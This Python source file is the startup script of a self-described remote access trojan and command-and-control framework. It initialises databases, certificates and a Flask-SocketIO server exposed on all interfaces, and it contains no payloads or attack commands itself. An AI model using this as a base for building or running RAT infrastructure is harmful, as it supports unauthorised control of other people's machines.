#!/usr/bin/env python3
"""
Main Entry Point for Oranolio RAT - Elite C2 Framework
Single entry point that initializes and starts all services
"""

import os
import sys
import time
import signal
import threading
import logging
from pathlib import Path
from typing import Optional

# Add current directory to Python path
sys.path.insert(0, os.path.dirname(__file__))

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler('logs/main.log')
    ]
)
logger = logging.getLogger(__name__)

class OranolioRATSystem:
    """Main system class that manages all components"""
    
    def __init__(self):
        self.running = False
        self.components = {}
        self.threads = []
        
        # Ensure log directory exists
        os.makedirs('logs', exist_ok=True)
        
        # Setup signal handlers
        signal.signal(signal.SIGINT, self._signal_handler)
        signal.signal(signal.SIGTERM, self._signal_handler)
    
    def _signal_handler(self, signum, frame):
        """Handle shutdown signals"""
        logger.info(f"Received signal {signum}, shutting down...")
        self.shutdown()
    
    def initialize(self):
        """Initialize all system components"""
        logger.info("Initializing Oranolio RAT - Elite C2 Framework...")
        
        try:
            # Initialize databases
            self._initialize_databases()
            
            # Initialize SSL certificates
            self._initialize_ssl()
            
            # Initialize core components
            self._initialize_components()
            
            logger.info("System initialization completed successfully")
            return True
            
        except Exception as e:
            logger.error(f"System initialization failed: {e}")
            return False
    
    def _initialize_databases(self):
        """Initialize all required databases"""
        logger.info("Initializing databases...")
        
        try:
            from initialize_databases import DatabaseInitializer
            
            initializer = DatabaseInitializer()
            if not initializer.initialize_all_databases():
                raise Exception("Database initialization failed")
            
            if not initializer.verify_databases():
                raise Exception("Database verification failed")
            
            logger.info("Databases initialized successfully")
            
        except Exception as e:
            logger.error(f"Database initialization failed: {e}")
            raise
    
    def _initialize_ssl(self):
        """Initialize SSL certificates"""
        logger.info("Initializing SSL certificates...")
        
        try:
            from ssl_utils import CertificateManager
            
            cert_manager = CertificateManager()
            success, message = cert_manager.generate_self_signed_certificate()
            
            if not success:
                logger.warning(f"SSL certificate generation failed: {message}")
                logger.warning("System will run without SSL (not recommended for production)")
            else:
                logger.info("SSL certificates initialized successfully")
            
        except Exception as e:
            logger.warning(f"SSL initialization failed: {e}")
            logger.warning("System will run without SSL")
    
    def _initialize_components(self):
        """Initialize all system components"""
        logger.info("Initializing system components...")
        
        try:
            # Initialize error handler
            from error_handler import error_handler
            self.components['error_handler'] = error_handler
            
            # Initialize validation manager
            from validation_schemas import validation_manager
            self.components['validation_manager'] = validation_manager
            
            # Initialize web app enhancements
            from web_app_enhancements import (
                connection_manager, metrics_collector, enhanced_logger
            )
            self.components['connection_manager'] = connection_manager
            self.components['metrics_collector'] = metrics_collector
            self.components['enhanced_logger'] = enhanced_logger
            
            # Initialize native protocol bridge
            from native_protocol_bridge import native_bridge
            self.components['native_bridge'] = native_bridge
            
            logger.info("System components initialized successfully")
            
        except Exception as e:
            logger.error(f"Component initialization failed: {e}")
            raise
    
    def start(self):
        """Start all system services"""
        logger.info("Starting Oranolio RAT - Elite C2 Framework...")
        
        try:
            self.running = True
            
            # Start native protocol bridge
            self._start_native_bridge()
            
            # Start web application
            self._start_web_application()
            
            logger.info("All services started successfully")
            logger.info("System is ready for operation")
            
        except Exception as e:
            logger.error(f"Failed to start services: {e}")
            self.shutdown()
            raise
    
    def _start_native_bridge(self):
        """Start the native protocol bridge"""
        logger.info("Starting native protocol bridge...")
        
        try:
            native_bridge = self.components['native_bridge']
            native_bridge.start_server()
            
            logger.info("Native protocol bridge started")
            
        except Exception as e:
            logger.error(f"Failed to start native protocol bridge: {e}")
            raise
    
    def _start_web_application(self):
        """Start the web application"""
        logger.info("Starting web application...")
        
        try:
            from web_app import app, socketio
            from c2_integration import initialize_c2_system
            
            # Initialize C2 system first
            if not initialize_c2_system():
                logger.warning("C2 system initialization failed, continuing with mock components")
            
            # Integrate enhancements
            from web_app_enhancements import integrate_enhancements
            app = integrate_enhancements(app)
            
            # Start the web server
            socketio.run(
                app,
                host='0.0.0.0',
                port=5000,
                debug=False,
                use_reloader=False,
                log_output=True,
                allow_unsafe_werkzeug=True
            )
            
        except Exception as e:
            logger.error(f"Failed to start web application: {e}")
            raise
    
    def shutdown(self):
        """Shutdown all services gracefully"""
        logger.info("Shutting down system...")
        
        self.running = False
        
        try:
            # Stop native protocol bridge
            if 'native_bridge' in self.components:
                self.components['native_bridge'].stop_server()
                logger.info("Native protocol bridge stopped")
            
            # Stop all threads
            for thread in self.threads:
                if thread.is_alive():
                    thread.join(timeout=5)
            
            logger.info("System shutdown completed")
            
        except Exception as e:
            logger.error(f"Error during shutdown: {e}")
    
    def get_status(self):
        """Get system status"""
        status = {
            'running': self.running,
            'components': list(self.components.keys()),
            'threads': len(self.threads)
        }
        
        # Add component status
        for name, component in self.components.items():
            if hasattr(component, 'get_status'):
                status[f'{name}_status'] = component.get_status()
        
        return status

def main():
    """Main function"""
    print("Oranolio RAT - Elite C2 Framework")
    print("=" * 50)
    
    # Check Python version
    if sys.version_info < (3, 8):
        print("Error: Python 3.8 or higher is required")
        sys.exit(1)
    
    # Check required dependencies
    try:
        import flask
        import flask_socketio
        import sqlite3
    except ImportError as e:
        print(f"Error: Missing required dependency: {e}")
        print("Please run: pip install -r requirements.txt")
        sys.exit(1)
    
    # Create system instance
    system = OranolioRATSystem()
    
    try:
        # Initialize system
        if not system.initialize():
            print("System initialization failed!")
            sys.exit(1)
        
        # Start system
        system.start()
        
    except KeyboardInterrupt:
        print("\nShutdown requested by user")
        system.shutdown()
    except Exception as e:
        print(f"System error: {e}")
        system.shutdown()
        sys.exit(1)

if __name__ == "__main__":
    main()